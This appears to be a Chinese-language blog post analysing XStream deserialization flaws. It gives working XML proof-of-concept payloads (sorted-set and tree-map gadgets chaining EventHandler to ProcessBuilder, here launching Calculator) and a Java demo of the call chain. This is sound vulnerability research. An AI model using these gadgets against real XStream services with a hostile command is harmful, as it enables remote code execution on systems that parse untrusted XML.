# Xstream 反序列化漏洞分析



## what is Xstream

*Stream*是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象



## How to use Xstream

### 1.ClassToXml

***TesttoXml.java***

```java
package com.L4G;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

class TestToXml {
    public static void main(String [] args) {
        Person person = new Person();
        person.setAge(18);
        person.setName("yds");
        XStream xstream = new XStream(new DomDriver());
        String xml = xstream.toXML(person);
        System.out.println(xml);
    }
}
```



### 2.XmlToClass

***XmltoTest***

```java
package com.L4G;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

import java.io.FileInputStream;
import java.io.FileNotFoundException;

public class TestToPerson {
    public static void main(String[] args) throws FileNotFoundException {
        FileInputStream xml = new FileInputStream("person.xml");
        XStream xStream = new XStream(new DomDriver());
        Person person = (Person)xStream.fromXML(xml);
        System.out.println(person);
    }
}

```

***person.xml***

```xml
<sorted-set>
<string>foo</string>
<dynamic-proxy>
<interface>java.lang.Comparable</interface>
<handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
        <command>
            <string>open</string>
            <string>/System/Applications/Calculator.app</string>
        </command>
    </target>
    <action>start</action>
</handler>
</dynamic-proxy>
</sorted-set>
```





## 漏洞分析

### 1.基于sorted-set



#### 影响范围：

xstream1.4.6，1.4.5，1.4.10



#### POC：

```xml
<sorted-set>
<string>yds</string>
<dynamic-proxy>
<interface>java.lang.Comparable</interface>
<handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
        <command>
            <string>open</string>
            <string>/System/Applications/Calculator.app</string>
        </command>
    </target>
    <action>start</action>
</handler>
</dynamic-proxy>
</sorted-set>
```



#### 分析

先看一下整个调用的过程，首先看一下官方文档

![image-20201117122256560](https://tva1.sinaimg.cn/large/0081Kckwly1gks1ymxxqaj30t604ltar.jpg)

Xstream是允许通过\<dynamic-proxy\>去作为一个动态代理的，下面把真的导致反序列化漏洞的代码单独拉出来写一个demo



```java
package com.L4G;

import com.sun.beans.finder.MethodFinder;
import sun.reflect.misc.MethodUtil;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

//把最终导致了反序列化漏洞的代码单独拿出来
public class Demo {
    public static void main(String[] args) {
        Comparable<String> realSubject = new RealSubject(); //1
        InvocationHandler handler = new DynamicProxy(realSubject); //2
        Comparable<String> proxy = (Comparable<String>) Proxy.newProxyInstance(handler.getClass().getClassLoader(), realSubject.getClass().getInterfaces(), handler);//3
        System.out.println(proxy.getClass().getName());
        proxy.compareTo(null);
    }
}

class RealSubject implements Comparable {

    @Override
    public int compareTo(Object o) {
        return 0;
    }
}
class DynamicProxy implements InvocationHandler {
    Comparable realSubject;
    String action = "start";
    Object target;

    public DynamicProxy(Comparable<String> realSubject) {
        this.realSubject = realSubject;
    }

    public Object invoke(Object object, Method method, Object[] args) throws Throwable {
        this.realSubject.compareTo(args);
        invokeInternal(object, method, args);

        return null;
    } //4

    public Object invokeInternal(Object proxy, Method method, Object[] arguments) throws Exception {
        action = "start";
        target = new ProcessBuilder("open", "/System/Applications/Calculator.app");
        Method method1 = getMethod(target.getClass(), action, new Class[]{});
        return MethodUtil.invoke(method1, target, new Object[]{});
    }

    public Method getMethod(Class<?> type, String name, Class<?>... args){
        try {
            return MethodFinder.findMethod(type, name, args);
        }
        catch (NoSuchMethodException exception) {
            return null;
        }
    }
}
```

这就是一个典型的JAVA中动态代理的写法，按照句末的编号来解释一下整个代码

1）因为最终需要调用  ***compareTo*** 方法所以这里的 ***RealSubject*** 需要继承 ***Comparable*** 接口

2）创建 ***InvocationHandler*** 实例 ***handler***，用来处理 ***Proxy*** 所有方法调用

3）生成代理对象；***handler*** 指的是一个 InvocationHandler 对象，表示的是当我这个动态代理对象在调用方法的时候，会关联到哪一个 InvocationHandler 对象上；***realSubject.getClass().getInterfaces()*** 指的是将要给我需要代理的对象提供一组什么接口，如果我提供了一组接口给它，那么这个代理对象就宣称实现了该接口(多态)，这样我就能调用这组接口中的方法了

4）这里的invoke方法就是反射中的调用了，这里进行了 overwrite



看一下具体的其中具体的标签代表什么

- dynamic-proxy 代表一个代理实例
- dynamic-proxy 代表的代理实例调用了Comparable接口
- dynamic-proxy中有一个handler
- handler中有两个参数，target 为 ProcessBuilder， action 为 start



再看整个漏洞触发流程

- Unmarshal函数对整个xml进行解析，整个对象其实就是一个sort-set的实例对象，其中调用了TreeMap.putAll,而这里调用了$Proxy0.compareTo才是真正触发反序列化漏洞的原因（不是compareTo函数导致的命令执行，是条件但不是直接原因）

  ![image-20201117123132276](https://tva1.sinaimg.cn/large/0081Kckwly1gks27jm0frj30cj0gd7ep.jpg)



- 因为要调用compareTo方法，动态代理就需要去调用invoke方法进行反射调用，这里就是触发的地方了`EventHandler.invoke -> EventHandler.invokeInternal->MethodUtil.invoke`

- 来看一下到达`MethodUtil.invoke`时，各参数的具体内容

  ![image-20201117123813461](https://tva1.sinaimg.cn/large/0081Kckwly1gks2ehsz9oj30ie03n75s.jpg)

  这里的TargetMethod就是上面action中赋的start, 而 target 就是之前赋值的 java.lang.ProcessBuilder，这样以来就成功执行了java.lang.ProcessBuilder

![image-20201117123820501](https://tva1.sinaimg.cn/large/0081Kckwly1gks2emeyksj30io050acd.jpg)

​	



### 2.基于tree-map

#### 影响范围：

1.4.x

#### POC

```xml
<tree-map>
    <entry>
        <string>key</string>
        <string>value</string>
    </entry>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
            						<string>open</string>
            						<string>/System/Applications/Calculator.app</string>
                    </command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```